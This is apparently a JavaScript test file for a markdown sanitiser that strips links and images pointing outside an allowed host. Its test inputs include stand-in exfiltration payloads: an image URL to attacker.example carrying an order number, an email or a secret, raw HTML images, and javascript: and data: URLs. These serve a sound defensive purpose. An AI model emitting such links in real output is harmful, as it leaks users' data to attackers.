import { test } from "node:test";
import assert from "node:assert/strict";
import { stripUntrustedLinks } from "./safe_markdown.mjs";

const HOSTS = ["docs.example.com"];

test("image pointing to an attacker is removed", () => {
  const out = stripUntrustedLinks(
    "Your order shipped. ![status](https://attacker.example/p.png?d=A-1001%20ada@example.com)", HOSTS);
  assert.equal(out, "Your order shipped. status");
  assert.ok(!out.includes("attacker"));
});

test("links to allowed hosts stay, others become text", () => {
  const out = stripUntrustedLinks(
    "See [the guide](https://docs.example.com/returns) or [click here](https://evil.example/x).", HOSTS);
  assert.equal(out, "See [the guide](https://docs.example.com/returns) or click here.");
});

test("javascript:, data: and http: URLs are not allowed", () => {
  const out = stripUntrustedLinks(
    "[a](javascript:alert(1)) [b](data:text/html,hi) [c](http://docs.example.com/)", HOSTS);
  assert.ok(!out.includes("javascript:"));
  assert.ok(!out.includes("data:"));
  assert.ok(!out.includes("http://"));
});

test("reference-style images and raw HTML images are removed", () => {
  const out = stripUntrustedLinks(
    "Done ![x][1]\n\n[1]: https://attacker.example/?secret=abc\n<img src=https://attacker.example/i>", HOSTS);
  assert.ok(!out.includes("attacker.example"));
});
